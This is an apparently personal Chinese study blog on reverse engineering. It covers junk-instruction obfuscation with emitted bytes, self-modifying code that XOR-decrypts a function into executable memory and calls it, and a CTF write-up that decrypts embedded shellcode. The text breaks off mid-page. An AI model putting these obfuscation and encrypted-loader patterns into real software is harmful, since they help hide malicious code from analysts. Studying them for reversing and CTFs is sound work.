class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked)</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">__asm &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push eax</span><br><span class="line">xor eax, eax</span><br><span class="line">test eax, eax</span><br><span class="line">jz label1</span><br><span class="line">jnz label1</span><br><span class="line">__emit <span class="number">0xe9</span></span><br><span class="line">label1:</span><br><span class="line">pop eax</span><br><span class="line">mov ebx, <span class="number">1</span></span><br><span class="line">add eax, ebx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240911192006290.png" alt="image-20240911192006290"></p><p>实际运行，CPU永远不会来到这些错乱的地方</p><p>jz花指令，必定为0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked)</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">__asm &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push eax</span><br><span class="line">xor eax, eax</span><br><span class="line">test eax, eax</span><br><span class="line">jz label1</span><br><span class="line">__emit <span class="number">0xe9</span></span><br><span class="line">label1:</span><br><span class="line">pop eax</span><br><span class="line">mov ebx, <span class="number">1</span></span><br><span class="line">add eax, ebx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>call</p><p>执行call指令需要将EIP压栈（EIP 寄存器保存着下一个要执行的指令的内存地址。换句话说，它指向 CPU 当前正在执行的指令序列中的下一个指令的位置。）</p><p>（ESP指向栈顶）</p><p>add dword PTR [esp], 7 ，栈顶+7,直接指向add eax,5</p><p>2+5</p><p>ret和call对应</p><p>call：压栈+跳转</p><p>ret：出栈+跳转（栈顶数据弹出，跳转执行）</p><p>在第一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked)</span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">__asm &#123;</span><br><span class="line"></span><br><span class="line">call label2</span><br><span class="line">__emit <span class="number">0xE9</span> </span><br><span class="line">label2:</span><br><span class="line">add dword PTR [esp], <span class="number">7</span></span><br><span class="line">#第一个字节：操作码 C2 第二个字节：位移量，即 <span class="number">1</span> 的编码，通常表示为 <span class="number">0x01</span>            </span><br><span class="line">ret</span><br><span class="line">#__emit <span class="number">0xE9</span> 操作码，__emit 占 <span class="number">1</span> 个字节。紧随其后的位移量，占 <span class="number">4</span> 个字节。总共，__emit <span class="number">0xE9</span> 插入的机器码占 <span class="number">5</span> 个字节。</span><br><span class="line">__emit <span class="number">0xE9</span>  </span><br><span class="line"></span><br><span class="line">add eax, <span class="number">5</span></span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>地址计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; 假设程序入口点的地址为 0x08048000</span><br><span class="line">    push ebp        ; 指令长度 1 字节</span><br><span class="line">    mov ebp, esp    ; 指令长度 3 字节</span><br><span class="line">    sub esp, 4      ; 指令长度 3 字节</span><br><span class="line">    call some_func  ; 指令长度 5 字节</span><br><span class="line">    add esp, 4      ; 指令长度 3 字节</span><br><span class="line">    pop ebp         ; 指令长度 1 字节</span><br><span class="line">    ret             ; 指令长度 1 字节</span><br><span class="line"></span><br><span class="line">some_func:</span><br><span class="line">    ; 函数体</span><br><span class="line">    ret             ; 指令长度 1 字节</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">在这个例子中，程序的入口点 _start 的地址假设为 0x08048000。那么每个指令的地址如下：</span><br><span class="line"></span><br><span class="line">push ebp 的地址是 0x08048000</span><br><span class="line">mov ebp, esp 的地址是 0x08048001（因为 push ebp 占用了 1 字节）</span><br><span class="line">sub esp, 4 的地址是 0x08048004（因为 mov ebp, esp 占用了 3 字节）</span><br><span class="line">call some_func 的地址是 0x08048007（因为 sub esp, 4 占用了 3 字节）</span><br><span class="line">add esp, 4 的地址是 0x0804800C（因为 call some_func 占用了 5 字节）</span><br><span class="line">pop ebp 的地址是 0x0804800F（因为 add esp, 4 占用了 3 字节）</span><br><span class="line">ret 的地址是 0x08048010（因为 pop ebp 占用了 1 字节）</span><br><span class="line">这些地址是由 EIP 或 RIP 在每次执行指令后自动递增的结果。每条指令执行后，EIP 或 RIP 会指向紧接着的一条指令的起始地址</span><br></pre></td></tr></table></figure><p>0XE8也可以代替0xE9</p><p>去除花指令手动：</p><p>IDA反汇编右键 undefined 快捷键U</p><p>正确入口右键code 快捷键C</p><p>自动去除：</p><p>把垃圾字节替换NOP 一个字节的0XE9</p><h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><p>SMC：</p><p>Self modifying Code</p><p>代码自修改</p><p>在一段代码执行前，对其修改，一般用来加密核心功能逻辑，加壳技术基础 隐藏核心功能代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SMCTest.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(naked)</span><br><span class="line"><span class="type">void</span> <span class="title function_">important_fun</span><span class="params">()</span> &#123;</span><br><span class="line">__asm &#123;</span><br><span class="line"></span><br><span class="line">mov eax, <span class="number">0x7657FD1E</span></span><br><span class="line">push <span class="number">0</span></span><br><span class="line">push <span class="number">0x6E617579</span></span><br><span class="line">push <span class="number">0x6E617578</span></span><br><span class="line">mov ebx, esp</span><br><span class="line"></span><br><span class="line">push <span class="number">0</span></span><br><span class="line">push ebx</span><br><span class="line">push ebx</span><br><span class="line">push <span class="number">0</span></span><br><span class="line">call eax</span><br><span class="line">add esp, <span class="number">0x0C</span></span><br><span class="line"></span><br><span class="line">ret</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">important_fun2</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello, world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt_fun</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> encryped_code[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* ptr = (<span class="type">unsigned</span> <span class="type">char</span>*)important_fun;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">encryped_code[i] = ptr[i] ^ <span class="number">0x11</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%02X, &quot;</span>, encryped_code[i]);</span><br><span class="line"><span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n======================================\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%02X, &quot;</span>, ptr[i]);</span><br><span class="line"><span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt_fun</span><span class="params">(PVOID address)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* ptr = (<span class="type">unsigned</span> <span class="type">char</span>*)address;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">ptr[i] = ptr[i] ^ <span class="number">0x11</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%02X, &quot;</span>, ptr[i]);</span><br><span class="line"><span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> g_code[] = &#123;</span><br><span class="line"><span class="number">0xA9</span>, <span class="number">0x0F</span>, <span class="number">0xEC</span>, <span class="number">0x46</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x11</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0x68</span>, <span class="number">0x64</span>, <span class="number">0x70</span>, <span class="number">0x7F</span>, <span class="number">0x79</span>, <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x70</span>,</span><br><span class="line"><span class="number">0x7F</span>, <span class="number">0x9A</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0x11</span>, <span class="number">0x42</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>,</span><br><span class="line"><span class="number">0x11</span>, <span class="number">0xEE</span>, <span class="number">0xC1</span>, <span class="number">0x92</span>, <span class="number">0xD5</span>, <span class="number">0x1D</span>, <span class="number">0xD2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">smc_test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">PVOID codePage = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">4096</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (codePage) &#123;</span><br><span class="line">ZeroMemory(codePage, <span class="number">4096</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(codePage, g_code, <span class="keyword">sizeof</span>(g_code));</span><br><span class="line">decrypt_fun(codePage);</span><br><span class="line"></span><br><span class="line">__asm &#123;</span><br><span class="line">call codePage</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;start&quot;</span>, MB_OK);</span><br><span class="line"><span class="comment">//important_fun();</span></span><br><span class="line">encrypt_fun();</span><br><span class="line"></span><br><span class="line"><span class="comment">//smc_test();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//important_fun2();</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1、如何自动去除花指令</p><p>2、如何用汇编实现调用messageboxA</p><p><a href="https://xz.aliyun.com/t/14580?time__1311=GqAhDKYK7Iox/tXeBKGQDktG8DgiT9tSYIeD">https://xz.aliyun.com/t/14580?time__1311=GqAhDKYK7Iox%2FtXeBKGQDktG8DgiT9tSYIeD</a></p><h2 id="逆向题"><a href="#逆向题" class="headerlink" title="逆向题"></a>逆向题</h2><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912093831338.png" alt="image-20240912093831338"></p><p>IDA静态分析：</p><p>跟进数组，转换为array</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912101452068.png" alt="image-20240912101452068"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912101949184.png" alt="image-20240912101949184"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912102012608.png" alt="image-20240912102012608"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912102041495.png" alt="image-20240912102041495"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912102119320.png" alt="image-20240912102119320"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912102129454.png" alt="image-20240912102129454"></p><p>将字节码复制出来，使用插件</p><p><a href="https://github.com/P4nda0s/LazyIDA">https://github.com/P4nda0s/LazyIDA</a></p><p>插件报错修改</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912110346721.png" alt="image-20240912110346721"></p><p>选中转换convert</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912110929475.png" alt="image-20240912110929475"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>convert hex string</p><p>Winhex &#x3D;&gt; 右键编辑&#x3D;&gt; 剪切板数据 &#x3D;&gt; 写入</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912111755390.png" alt="image-20240912111755390"></p><p>这种直接在IDA读取的字节码是经过异或加密的需要先进行解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shellcode解密.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">const</span> <span class="type">char</span> byte_403018[] = &#123;</span><br><span class="line">    <span class="number">0xA1</span>, <span class="number">0xCE</span>, <span class="number">0x02</span>, <span class="number">0x56</span>, <span class="number">0x21</span>, <span class="number">0x57</span>, <span class="number">0x23</span>, <span class="number">0xCA</span>, <span class="number">0x11</span>, <span class="number">0xEB</span>, <span class="number">0x71</span>, <span class="number">0x90</span>, <span class="number">0x4C</span>, <span class="number">0x74</span>, <span class="number">0x9A</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0xAA</span>, <span class="number">0x76</span>, <span class="number">0x06</span>, <span class="number">0x29</span>, <span class="number">0xAA</span>, <span class="number">0x76</span>, <span class="number">0x06</span>, <span class="number">0x2D</span>, <span class="number">0xAA</span>, <span class="number">0x76</span>, <span class="number">0x06</span>, <span class="number">0x34</span>, <span class="number">0xA9</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x06</span>, <span class="number">0x0E</span>, <span class="number">0x75</span>, <span class="number">0x91</span>, <span class="number">0x43</span>, <span class="number">0x11</span>, <span class="number">0xDD</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x3E</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x3F</span>,</span><br><span class="line">    <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x3C</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x3D</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x06</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x07</span>,</span><br><span class="line">    <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x04</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x0A</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x0B</span>,</span><br><span class="line">    <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x06</span>, <span class="number">0x08</span>, <span class="number">0xAA</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x09</span>, <span class="number">0xE4</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x2E</span>, <span class="number">0x5A</span>, <span class="number">0xE4</span>, <span class="number">0x66</span>, <span class="number">0x06</span>,</span><br><span class="line">    <span class="number">0x2F</span>, <span class="number">0x57</span>, <span class="number">0xAA</span>, <span class="number">0x7E</span>, <span class="number">0x06</span>, <span class="number">0x2C</span>, <span class="number">0xE4</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x32</span>, <span class="number">0x5B</span>, <span class="number">0xE4</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x33</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="number">0xAA</span>, <span class="number">0x7E</span>, <span class="number">0x06</span>, <span class="number">0x30</span>, <span class="number">0xE4</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x36</span>, <span class="number">0x0F</span>, <span class="number">0xE4</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x37</span>, <span class="number">0x58</span>, <span class="number">0xE4</span>, <span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x34</span>, <span class="number">0x4A</span>, <span class="number">0xE4</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x35</span>, <span class="number">0x4B</span>, <span class="number">0xE4</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x3A</span>, <span class="number">0x44</span>, <span class="number">0xE4</span>, <span class="number">0x66</span>, <span class="number">0x06</span>,</span><br><span class="line">    <span class="number">0x3B</span>, <span class="number">0x47</span>, <span class="number">0xE4</span>, <span class="number">0x66</span>, <span class="number">0x06</span>, <span class="number">0x39</span>, <span class="number">0x45</span>, <span class="number">0xA9</span>, <span class="number">0xD0</span>, <span class="number">0x1A</span>, <span class="number">0x28</span>, <span class="number">0x56</span>, <span class="number">0x2F</span>, <span class="number">0x21</span>, <span class="number">0xD2</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0xDA</span>, <span class="number">0x1A</span>, <span class="number">0x2C</span>, <span class="number">0x57</span>, <span class="number">0xDA</span>, <span class="number">0xA1</span>, <span class="number">0xDD</span>, <span class="number">0x32</span>, <span class="number">0x56</span>, <span class="number">0x2B</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x10</span>, <span class="number">0xE2</span>, <span class="number">0x79</span>, <span class="number">0xA1</span>,</span><br><span class="line">    <span class="number">0xE6</span>, <span class="number">0x02</span>, <span class="number">0xE1</span>, <span class="number">0x72</span>, <span class="number">0x11</span>, <span class="number">0xE2</span>, <span class="number">0xA7</span>, <span class="number">0xE2</span>, <span class="number">0x56</span>, <span class="number">0x23</span>, <span class="number">0xCB</span>, <span class="number">0x7A</span>, <span class="number">0xAF</span>, <span class="number">0x56</span>, <span class="number">0x06</span>, <span class="number">0x2E</span>,</span><br><span class="line">    <span class="number">0xAF</span>, <span class="number">0x5E</span>, <span class="number">0x06</span>, <span class="number">0x3E</span>, <span class="number">0x09</span>, <span class="number">0xD0</span>, <span class="number">0x09</span>, <span class="number">0xD8</span>, <span class="number">0x77</span>, <span class="number">0xC9</span>, <span class="number">0x21</span>, <span class="number">0xAF</span>, <span class="number">0x6B</span>, <span class="number">0x22</span>, <span class="number">0x2D</span>, <span class="number">0x9C</span>,</span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x34</span>, <span class="number">0x2D</span>, <span class="number">0x9C</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0xC9</span>, <span class="number">0x2D</span>, <span class="number">0x94</span>, <span class="number">0x3E</span>, <span class="number">0x35</span>, <span class="number">0x19</span>, <span class="number">0xC9</span>, <span class="number">0x57</span>, <span class="number">0x33</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0x21</span>, <span class="number">0xF2</span>, <span class="number">0xA1</span>, <span class="number">0xDB</span>, <span class="number">0x32</span>, <span class="number">0x5E</span>, <span class="number">0xC4</span>, <span class="number">0x7F</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x79</span>, <span class="number">0xA1</span>, <span class="number">0xE6</span>, <span class="number">0x02</span>, <span class="number">0xE1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> decrypt_code[<span class="number">300</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* shellcode = fopen(<span class="string">&quot;jiemi.exe&quot;</span>,<span class="string">&quot;wb+&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(byte_403018); ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt_code[i] = byte_403018[i] ^ <span class="number">0x22</span>;</span><br><span class="line"></span><br><span class="line">        fputc(decrypt_code[i], shellcode);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%2X &quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)decrypt_code[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> ==<span class="number">15</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    fclose(shellcode);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用IDA打开二进制exe，发现E8疑似花指令</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912113744806.png" alt="image-20240912113744806"></p><p>对E8字节码使用undefined，33字节码使用code</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912132312014.png" alt="image-20240912132312014"></p><p>无法F5翻译成伪代码，对汇编进行人工翻译</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240912142206786.png" alt="image-20240912142206786"></p><p>栈为先进先出，所以存在字符串</p><p>xuanyuan-zhifeng</p><p>后面IDA有点分析不下去了，使用x32dbg进行动态分析</p><p>使用字符串查找定位到flag</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240913104029726.png" alt="image-20240913104029726"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240913104942890.png" alt="image-20240913104942890"></p><p>第一个关键点比较输入字符长度是否等于16</p><p><img 